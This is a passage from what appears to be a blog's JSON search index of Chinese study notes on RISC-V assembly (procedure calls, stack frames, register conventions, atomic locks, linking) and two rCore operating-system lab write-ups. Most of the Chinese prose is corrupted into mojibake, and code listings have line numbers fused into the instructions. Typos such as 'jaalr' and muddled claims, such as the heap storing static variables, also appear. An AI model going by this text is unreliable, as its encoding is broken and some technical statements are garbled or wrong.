ä¿å­˜åˆ° x1 å¯„å­˜å™¨ è¢«æ‰§è¡Œçš„è¿‡ç¨‹å–åˆ°x1åœ°å€ï¼Œå¹¶ç»§ç»­æ‰§è¡Œ 1jalr x0,0(x1) æˆ– ç›´æ¥è¿›è¡Œæ— æ¡ä»¶è·³è½¬ 1jal x0,Label å¦‚æœä¸€ä¸ªè¿‡ç¨‹éœ€è¦ç”¨åˆ°å¤šä¸ªå¯„å­˜å™¨ï¼Œä½¿ç”¨å®Œæˆåè¿˜éœ€è¦æ¢å¤ï¼Œå­˜å‚¨å¤šä¸ªå€¼æ˜¯ï¼Œå°±éœ€è¦ä½¿ç”¨å †æ ˆ ä¾‹å¦‚ 1234567long long int leaf_example(long long int g,long long int h, long long int i,long long int j)&#123; long long int f; f=(g+h)-(i+j); return f;&#125; ç¿»è¯‘ä¸ºæ±‡ç¼–è¯­è¨€ 12345678910111213141516leaf_example:addi sp,sp,-24sd x5,16(sp)sd x6,8(sp)sd x20,0(sp)add x5,x10,x11add x6,x12,x13sub x20,x5,x6addi x10,x20,0ld x20,0(sp)ld x6,8(sp)ld x5,16(sp)addi sp,sp,24jaalr x0,0(x1) å…¶ä¸­ g/h/i/jå¯¹åº”x10/x11/x12/x13ï¼Œfå¯¹åº”x20 å¯„å­˜å™¨åˆ†ç±»RISC-V å°† 19 ä¸ªä¸´æ—¶å¯„å­˜å™¨åˆ†ä¸ºä¸¤ç±» x5-x7 and x28-x31 ï¼š åœ¨è¿‡ç¨‹è°ƒç”¨æ—¶ä¸ä¼šè¢«è°ƒç”¨æ–¹ä¿å­˜çš„ x8-x9 and x18-x27 ï¼š åœ¨è¿‡ç¨‹è°ƒç”¨æ—¶ä¸€å®šä¼šè¢«ä¿å­˜çš„ æ‰€ä»¥ line3/4/13/14 storeå’Œload çš„æ“ä½œå¯ä»¥çœå» åµŒå¥—ç¨‹åºå¦‚æœç¨‹åº è°ƒç”¨å…¶ä»–çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¾ˆå¥½ç†è§£ï¼Œä½†æ˜¯ å¦‚æœè°ƒç”¨è‡ªå·±ï¼Œå½¢æˆé€’å½’è¿‡ç¨‹ï¼Œæˆ‘ä»¬å°±è¦ç‰¹æ®Šæ³¨æ„äº† ä¾‹å­ ï¼š é€’å½’ 1234567long long int fact(long long int n)&#123; if(n&lt;1) return(1) else return (n*fact(n-1))&#125;//parameter nå­˜åœ¨x10ä¸­ 123456789101112131415161718192021222324FACT: addi sp,sp,-16 &#x2F;&#x2F;adjust stack for 2 items sd x1,8(sp) &#x2F;&#x2F;save the return address sd x10,0(sp) &#x2F;&#x2F;save the argument n addi x5,x10,-1 &#x2F;&#x2F;x5&#x3D;n-1 bge x5,x0,L1 &#x2F;&#x2F;if(n-1)&gt;&#x3D;0,go to L1 addi x10,x0,1 &#x2F;&#x2F;return 1 addi sp,sp,16 &#x2F;&#x2F;pop 2 items off stack jalr x0,0(x1) &#x2F;&#x2F;return to callerL1: addi x10,x10,-1 &#x2F;&#x2F;n&gt;&#x3D;1: argument gets(n-1) jal x1,FACT &#x2F;&#x2F;call fact with(n-1) addi x6,x10,0 &#x2F;&#x2F;return from jal:move result of fact(n-1) to x6 ld x10,0(sp) &#x2F;&#x2F;restore argument n ld x1,8(sp) &#x2F;&#x2F;restore the return address addi sp,sp,16 &#x2F;&#x2F;adjust stack point to pop 2 items mul x10,x10,x6 &#x2F;&#x2F;return n*fact(n-1) jalr x0,0(x1) &#x2F;&#x2F;return to the caller â€‹ æ³¨æ„jalã€jalrï¼Œld ç­‰æŒ‡ä»¤æŒ‡æŒ¥è¿™æŒ‡ä»¤è·³æ¥è·³å»ï¼Œå¹¶ä¸”å°†stackçš„å‚æ•°ä¸€æ­¥æ­¥çš„æ¨å‡ºï¼› Cè¯­è¨€å˜é‡å¯ä»¥æŒ‰ç…§2ç±»åˆ†ï¼š ç±»å‹ æ•°å­— å­—ç¬¦ ç”Ÿå‘½å‘¨æœŸ automatic static automaticå¯¹äºä¸€ä¸ªè¿‡ç¨‹è€Œè¨€æ˜¯æœ¬åœ°çš„ï¼Œç¨‹åºè°ƒç”¨å®Œæˆåè‡ªåŠ¨æ¶ˆå¤±ï¼› staticåˆ™è´¯ç©¿å§‹ç»ˆï¼›ä¸€èˆ¬ç”¨staticæ ‡è¯†å£°æ˜ï¼› æ€»ç»“ä¸€ä¸‹ Preserved Not Preserved saved registersï¼šx8-x9,x18-x19 Temprary registers:x5-x7,x28-x31 Stack pointer register:x2(sp) Argument/result register:x10-x17 Frame pointer:x8(fp) Return address:x1(ra) Stack above the stack pointer Stack below the stack pointer åœ¨æ ˆä¸Šä¸ºæ–°æ•°æ®ç”³è¯·ç©ºé—´ Stackè¢«ç§°ä¸ºæ ˆï¼Œå­˜å‚¨ç¨‹åºè°ƒç”¨çš„automaticå‹çš„æœ¬åœ°å˜é‡ï¼› The segment of the stack containing a procdureâ€™s saved registers and local variables is called a procedure frame or activation record. ä¸€äº›RISC-Vç¼–è¯‘å™¨ä½¿ç”¨FPï¼ˆframe pointerï¼‰æŒ‡å‘æ ˆçš„æ”¶ä½å€¼ã€‚ä½¿ç”¨FPçš„å¥½å¤„æ˜¯å¯ä»¥å¾ˆæ–¹é¢çš„å®šä½local parameterçš„ä½ç½®ï¼Œæ–¹ä¾¿è°ƒè¯•ä¸å®šä½ï¼› Stackä¸€èˆ¬æ˜¯ä»é«˜åœ°å€å¾€ä½åœ°å€é€’å‡çš„ï¼› åœ¨å †ä¸Šä¸ºæ–°æ•°æ®ç”³è¯·ç©ºé—´ Heapè¢«ç§°ä¸ºå †ï¼Œå­˜å‚¨ç¨‹åºè°ƒç”¨çš„staticå‹å˜é‡ï¼› Heapæ˜¯ä»ä½åœ°å€å‘é«˜åœ°å€å¢åŠ çš„ï¼› å †çš„ç¬¬ä¸€ä¸ªåœ°å€æ˜¯ä¿ç•™çš„reservedï¼Œæ¥ç€æ˜¯text segementï¼ˆthe home of the RISC-V machine codeï¼‰ï¼Œå†å¾€ä¸Šå°±æ˜¯static data segment Cè¯­è¨€ä¸­ç”¨mallocç”¨freeæ¥åˆ†é…å’Œé‡Šæ”¾heapç©ºé—´ï¼› Cè¯­è¨€è¿™ç§æ‰‹åŠ¨åˆ†é…å’Œé‡Šæ”¾ç©ºé—´çš„æœºåˆ¶å¸¦æ¥äº†å¾ˆå¤šbugï¼Œç›¸æ¯”JAVAåˆ™ä¸ä¼šï¼› æœ€åç”¨ä¸€ä¸ªè¡¨æ ¼æ¥è¯´æ˜RISC-Vå¯„å­˜å™¨çš„çº¦å®šï¼š Name Register number Usage Presrved on call x0 0 The constant value 0 n.a x1(ra) 1 Return address(link register) yes x2(sp) 2 Stack pointer yes x3(gp) 3 Global pointer yes x4(tp) 4 Thread pointer yes x5-x7 5-7 Temporaries no x8-x9 8-9 Saved yes x10-x17 10-17 Arguments/results no x18-x27 18-27 Saved yes x28-x31 28-31 Temporaries no 2.9 äººæœºäº¤äº’è®¡ç®—æœºå¦‚ä½•æ˜¾ç¤ºå‘¢ï¼Œé€šå¸¸ä½¿ç”¨8bitçš„ASCIIç ï¼› ä¸ºäº†æ–¹ä¾¿å­—ç¬¦æ“ä½œï¼ŒRISC-Væä¾›äº†ä¸¤ä¸ªæ±‡ç¼–æŒ‡ä»¤ 12lbu x12,0(x10) # è¯»sb x12,0(x11) # å†™ lbu: æ— ç¬¦å·åŠ è½½æ•°æ®,å°†å­—èŠ‚åŠ è½½åˆ°ç›®çš„å¯„å­˜å™¨çš„æœ€å³ç«¯ï¼› sb: ä¿å­˜å­—èŠ‚,å°†æœ€å³ä¾§çš„å­—èŠ‚å­˜å…¥å†…å­˜ï¼› stringæœ‰3ç§è¡¨ç¤ºæ–¹å¼ï¼š stringç¬¬ä¸€ä¸ªåœ°å€ä¿ç•™ï¼Œç»™å‡ºstringé•¿åº¦ï¼›- JAVA ç”¨ä¸€ä¸ªä¼´éšå˜é‡æ¥è¡¨ç¤ºstringé•¿åº¦ï¼› æœ€åç”¨ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦è¡¨ç¤ºstringç»“æŸï¼› - C RISC-Véœ€è¦ä½¿ç”¨load/store åŠä¸ªæœºå™¨å­—æŒ‡ä»¤æ¥loadå’Œstoreä¸€ä¸ªå­—ç¬¦ï¼› 12lhu x19,0(x10) &#x2F;&#x2F;Read halfword from sourcesh x10,0(x11) &#x2F;&#x2F;Write halfword to destination 2.10 RISC-V å¯¹äºå¤§ç«‹å³æ•°å’Œ åœ°å€ çš„å¤„ç†æ–¹æ³•2.11 å¹¶è¡Œ å’Œ æŒ‡ä»¤ ï¼š åŒæ­¥æ•°æ®ç«äº‰ ï¼š ä¸¤ä¸ªç¨‹åº è®¿é—®åŒä¸€ä¸ªæ•°æ®ï¼Œä¸€ä¸ªæœªå†™å®Œï¼Œä¸€ä¸ªå·²ç»å¼€å§‹è¯» åŒæ­¥æœºåˆ¶é€šå¸¸æ˜¯ç”±ç”¨æˆ·çº§è½¯ä»¶ä¾‹ç¨‹æ„å»ºçš„ï¼Œè¿™äº›ä¾‹ç¨‹ä¾èµ–äºç¡¬ä»¶æä¾›çš„åŒæ­¥æŒ‡ä»¤ è½¯ä»¶ä¹‹é—´é€šè¿‡ç¡¬ä»¶æä¾›çš„åŒæ­¥æŒ‡ä»¤æ¥æ„é€ åŒæ­¥æœºåˆ¶ï¼Œ æˆ‘ä»¬ä¸“æ³¨äº åŒæ­¥ä¸­ çš„ lock unlock ï¼Œè¿™å¯¹äºå•å¤„ç†å™¨å¾ˆå®¹æ˜“æ‰§è¡Œ æˆ‘ä»¬åœ¨å¤šå¤„ç†å™¨ä¸­å®ç°åŒæ­¥æ‰€éœ€è¦çš„å…³é”®èƒ½åŠ›æ˜¯ä¸€ç»„å…·æœ‰è‡ªåŠ¨è¯»å–å’Œä¿®æ”¹å†…å­˜ä½ç½®èƒ½åŠ›çš„ç¡¬ä»¶åŸè¯­; ä»¥atomic exchange/atomic swapä¸ºä¾‹ï¼Œå®ƒä¸»è¦å®Œæˆä¸¤ä¸ªå­˜å‚¨ä¹‹é—´çš„æ•°å€¼äº¤æ¢ï¼› Lock = 0è¡¨ç¤ºunlockï¼ŒLock = 1åˆ™è¡¨ç¤ºlockï¼› ä»è€Œå¼•å‡ºlr.d(è¯»å–åŒä¿ç•™å­—)å’Œsc.d(å­˜å‚¨æœ‰æ¡ä»¶çš„åŒå­—) 1234567 addi x12,x0,1 &#x2F;&#x2F;copy locked valueagain: lr.d x10,(x20) &#x2F;&#x2F;load-reserved to read lock bne x10,x0,again &#x2F;&#x2F;check if it is 0 yet sc.d x11,x12,(x20) &#x2F;&#x2F;attempt to store new value bne x11,x0,again &#x2F;&#x2F;branch if store fails sd x0,0(x20) &#x2F;&#x2F;free lock by writing 0 2.12 ç¼–è¯‘ å’Œ è¿æ¥ ç¨‹åºæœ¬èŠ‚ä¸»è¦è®²ä»ç£ç›˜ä¸€æ®µCè¯­è¨€æ–‡ä»¶åˆ°è®¡ç®—æœºå¯ä»¥æ‰§è¡Œçš„ç¨‹åºä¹‹é—´çš„4ä¸ªæ­¥éª¤ï¼š Compiler Compilerå°†é«˜çº§è¯­è¨€ç¼–è¯‘ä¸ºé€šç”¨çš„æ±‡ç¼–ï¼ˆé€šç”¨çš„æ±‡ç¼–æ˜¯å› ä¸ºæ²¡æœ‰ç›®çš„å™¨ä»¶ï¼‰ Assembler Assemblerå°±æ˜¯å™¨ä»¶å¯¹åº”çš„ç¼–è¯‘å™¨ï¼Œå°†é€šç”¨æ±‡ç¼–ç¼–è¯‘æˆå¯¹åº”å™¨ä»¶æ”¯æŒçš„æ±‡ç¼–ï¼› Linker é“¾æ¥å™¨ï¼Œå°†æºæ–‡ä»¶å’Œ åº“æ–‡ä»¶ï¼Œè¿›è¡Œé“¾æ¥ å¦‚ä½•åšåˆ°ä¿®æ”¹äº†ä¸€è¡Œä»£ç è€Œä¸ç”¨é‡æ–°å¼€å§‹ç¼–è¯‘ï¼› Dynamically Linked Libraries ä¼ ç»Ÿçš„link librariesçš„æ–¹æ³•æ˜¯staticæ–¹æ³•ï¼Œæœ‰ä¸€äº›ç¼ºç‚¹ï¼š The library routines become part of the executable code.æœ¨å·²æˆèˆŸï¼Œå†éš¾ä¿®æ”¹ï¼› æ‰€æœ‰çš„routineséƒ½è¦è¢«loadï¼Œç®¡ä½ è¦ä¸è¦ï¼› è¿™äº›ç¼ºç‚¹å¯¼è‡´äº†DLL(Dynamically linked libraries)çš„å‡ºç°ï¼› DLL,where the library routines are not linked an loaded until the program is run Starting a JAVA Program åˆæ­¥è®¤è¯†ä¸€äº›JVMå’ŒJITå§ å„ä¸ªå¹³å°æœ‰ä¸åŒçš„JVMï¼Œå¦‚windows JVMï¼ŒUNIX JVMç­‰ï¼Œåˆ†åˆ«è´Ÿè´£å°†JVMè™šæ‹Ÿæœºæœ€ç»ˆè§£ Windowså’ŒUnix instructionï¼›","link":"","tags":[{"name":"RISC-V","slug":"RISC-V","permalink":"https://dingiso.github.io/tags/RISC-V/"},{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"}]},{"title":"å®éªŒäºŒæ€»ç»“","date":"2020-07-19T09:27:05.000Z","path":"2020/07/19/å®éªŒäºŒ/","text":"å®éªŒäºŒçš„åˆ†æåŠè§£ç­” å®éªŒäºŒ åŸç†ï¼š.bss å­—æ®µæ˜¯ä»€ä¹ˆå«ä¹‰ï¼Ÿä¸ºä»€ä¹ˆæˆ‘ä»¬è¦å°†åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼ˆå †ï¼‰ç©ºé—´æ”¾åœ¨ .bss å­—æ®µï¼Ÿ æ”¾ç½®åœ¨æ­¤å¤„åªæ˜¯ä¸å¾—ä»¥è€Œä¸ºä¹‹ï¼Œæˆ‘ä»¬åœ¨ç‰©ç†é¡µé¢åˆ†é…æ—¶éœ€è¦ä½¿ç”¨åˆ° Vecï¼Œå¯¹äºæ“ä½œç³»ç»Ÿå†…æ ¸æˆ‘ä»¬å…·æœ‰çš„å­—æ®µå°±é‚£ä¹ˆå‡ ä¸ªï¼Œä¸ºäº†è®©è¿™æ®µç©ºé—´åŒ…å«åœ¨å†…æ ¸çš„äºŒè¿›åˆ¶æ•°æ®ä¸­ï¼Œæ”¾åœ¨.bss ä¸­åˆ©ç”¨äº†å…¶å­˜æ”¾å…¨å±€å˜é‡ä¸ä¼šé”€æ¯çš„ç‰¹æ€§ã€‚ åˆ†æï¼šæˆ‘ä»¬åœ¨åŠ¨æ€å†…å­˜åˆ†é…ä¸­å®ç°äº†ä¸€ä¸ªå †ï¼Œå®ƒå…è®¸æˆ‘ä»¬åœ¨å†…æ ¸ä»£ç ä¸­ä½¿ç”¨åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œä¾‹å¦‚ Vec Box ç­‰ã€‚é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬åœ¨å®ç°è¿™ä¸ªå †çš„è¿‡ç¨‹ä¸­ä½¿ç”¨ Vec è€Œä¸æ˜¯ [u8]ï¼Œä¼šå‡ºç°ä»€ä¹ˆç»“æœï¼Ÿ vec éœ€è¦å †åˆ†é…å™¨ä¸ºå…¶åˆ†é…ç©ºé—´ å †åˆ†é…å™¨ éœ€è¦åˆ©ç”¨ vec è¿›è¡Œåˆ†é… ä¼šé€ æˆäº’ç›¸ä¾èµ–ï¼Œäº’ç›¸è°ƒç”¨çš„æ­»é”ã€‚ å®éªŒ å›ç­”ï¼šalgorithm/src/allocator ä¸‹æœ‰ä¸€ä¸ª Allocator traitï¼Œæˆ‘ä»¬ä¹‹å‰ç”¨å®ƒå®ç°äº†ç‰©ç†é¡µé¢åˆ†é…ã€‚è¿™ä¸ªç®—æ³•çš„æ—¶é—´å’Œç©ºé—´å¤æ‚åº¦æ˜¯ä»€ä¹ˆï¼Ÿ stacked_Allocator çš„æ—¶é—´å¤æ‚åº¦ O(1) ç©ºé—´å¤æ‚åº¦ O(n) segment_tree_allocator çš„æ—¶é—´å¤æ‚åº¦ O(n) ï¼Œ ç©ºé—´å¤æ‚ O(n) äºŒé€‰ä¸€ï¼šå®ç°åŸºäºçº¿æ®µæ ‘çš„ç‰©ç†é¡µé¢åˆ†é…ç®—æ³•ï¼ˆä¸éœ€è¦è€ƒè™‘åˆå¹¶åˆ†é…ï¼‰ï¼›æˆ–å°è¯•ä¿®æ”¹ FrameAllocatorï¼Œä»¤å…¶ä½¿ç”¨æœªè¢«åˆ†é…çš„é¡µé¢ç©ºé—´ï¼ˆè€Œä¸æ˜¯å…¨å±€å˜é‡ï¼‰æ¥å­˜æ”¾é¡µé¢ä½¿ç”¨çŠ¶æ€ã€‚ å€ŸåŠ©ç»™å‡ºçš„ä»£ç å’Œè‡ªå·±çš„ç†è§£å®ç°çº¿æ®µæ ‘","link":"","tags":[{"name":"rCore","slug":"rCore","permalink":"https://dingiso.github.io/tags/rCore/"},{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"}]},{"title":"å®éªŒä¸€æ€»ç»“","date":"2020-07-12T05:21:32.000Z","path":"2020/07/12/å®éªŒä¸€/","text":"å®éªŒä¸€çš„åˆ†æåŠè§£ç­” å®éªŒé¢˜ for lab-1ä¸»è¦ä¿®æ”¹äº† entry.asm main.rs handler.rs å°†ä¸‰ä¸ªæ–‡ä»¶ä¸Šä¼ ä¸Šæ¥ x0 å¯„å­˜å™¨ é»˜è®¤å­˜å‚¨0x0 ï¼Œå¯ç›´æ¥æ— æ¡ä»¶è·³è½¬å³å¯ 1jr x0 æˆ– ä½¿ä¸‹ä¸€æ¡è¿è¡Œçš„æŒ‡ä»¤ä¸º 0x0 ï¼Œé€šè¿‡æ”¹å˜x1å¯„å­˜å™¨ 1ld x1 ,(x0) handle_interrupt å‡½æ•°å¢åŠ å¤„ç†é¡¹ï¼Œå¤„ç†è®¿é—®é”™è¯¯åœ°å€çš„æƒ…å†µï¼Œå¦‚æœ stval å€¼ä¸º0åˆ™æ‰“å°SUCCESSï¼ ç®€è¿°é¢˜1.åœ¨ rust_main å‡½æ•°ä¸­ï¼Œæ‰§è¡Œ ebreak å‘½ä»¤åè‡³å‡½æ•°ç»“æŸå‰ï¼Œsp å¯„å­˜å™¨çš„å€¼æ˜¯æ€æ ·å˜åŒ–çš„? å³åˆ†æ interrupt.asm .å¤„ç†ä¸­æ–­è¿‡ç¨‹ä¸­, 12345678910111213addi sp,sp, -34*8 # å¯¹ sp å‡ æ ˆä¸Šå¼€è¾Ÿ Context æ‰€éœ€ç©ºé—´SAVE x1, 1addi x1, sp, 34*8SAVE x1, 2# å…ˆå­˜x1,å†åˆ©ç”¨x1å­˜æ”¾åŸæ¥spå€¼ , ä¸åŠ¨ç”¨ x2(sp) ä»¥æ­£ç¡®ä½¿ç”¨ SAVE å®mv a0 sp# å°† sp ä½œä¸ºå‚æ•°è°ƒç”¨ handle_interruptLOAD x2, 2# æœ€åå°† sp(x2) çš„å€¼æ¢å¤ 2.å›ç­”ï¼šå¦‚æœå»æ‰ rust_main åçš„ panic ä¼šå‘ç”Ÿä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆï¼Ÿ 12345678910111213141516171819202122230000000080200000 text_start:80200000: 17 61 01 00 auipc sp, 2280200004: 13 01 01 59 addi sp, sp, 142480200008: 97 10 00 00 auipc ra, 18020000c: e7 80 a0 13 jalr 314(ra)0000000080200014 _ZN4core3ptr24slice_from_raw_parts_mut17h5b8d4c2d17da80d3E:; pub const fn slice_from_raw_parts_mut&lt;T&gt;(data: *mut T, len: usize) -&gt; *mut [T] &#123;80200014: 79 71 addi sp, sp, -4880200016: 2a f0 sd a0, 32(sp)80200018: 2e f4 sd a1, 40(sp); unsafe &#123; Repr &#123; raw: FatPtr &#123; data, len &#125; &#125;.rust_mut &#125;8020001a: 2a e8 sd a0, 16(sp)8020001c: 2e ec sd a1, 24(sp)8020001e: 2a e0 sd a0, 0(sp)80200020: 2e e4 sd a1, 8(sp); &#125;80200022: 45 61 addi sp, sp, 4880200024: 82 80 ret0000000080200026 _ZN4core3str11unwrap_or_017h6844c978da275184E:; fn unwrap_or_0(opt: Option&lt;&amp;u8&gt;) -&gt; u8 &#123;80200026: 41 11 addi sp, sp, -16 å¯ä»¥çœ‹åˆ° rust_mainåè¿˜æœ‰è®¸å¤šruståº“å‡½æ•°,å¯èƒ½ä¼šç›´æ¥ä»¥è¿è¡Œåº“å‡½æ•°é€ æˆä¸æ˜é”™è¯¯æˆ–æ­»å¾ªç¯ ä»£ç  åœ¨ å®éªŒé¢˜1","link":"","tags":[{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"}]}]